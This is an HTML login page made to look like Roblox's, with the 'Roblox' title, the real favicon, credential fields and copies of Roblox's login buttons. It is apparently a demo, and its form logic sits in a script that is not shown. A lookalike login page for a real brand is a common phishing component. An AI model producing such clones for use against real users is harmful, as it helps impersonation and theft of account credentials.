<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <!-- Вернул логотип во вкладку -->
    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="login-card" aria-labelledby="login-title">
        <h1 id="login-title">Log In to Roblox</h1>

        <form id="loginForm">
            <div class="demo-fields">
                <input
                    class="demo-input"
                    type="text"
                    id="username"
                    placeholder="Username/Email/Phone"
                    aria-label="Username, email or phone"
                    autocomplete="off"
                    autocapitalize="off"
                    spellcheck="false"
                    required
                >
                <input
                    class="demo-input"
                    type="password"
                    id="password"
                    placeholder="Password"
                    aria-label="Password"
                    autocomplete="new-password"
                    spellcheck="false"
                    required
                >

                <button class="demo-submit" type="submit">
                    Log In
                </button>
            </div>
        </form>

        <p class="demo-help" id="login-status" role="status" aria-live="polite">
            Forgot Password or Username?
        </p>

        <hr class="demo-divider">

        <div class="demo-actions">
            <button class="demo-action" type="button">
                Email Me a One-Time Code
            </button>
            <button class="demo-action" type="button">
                Quick Log In
            </button>
            <button class="demo-action" type="button">
                Other Log In Options
            </button>
        </div>

        <div class="demo-footer">
            <span>Don't have an account?</span>
            <button class="demo-link" type="button">
                Sign Up
            </button>
        </div>
    </main>

    <script src="script.js"></script>
</body>
</html>
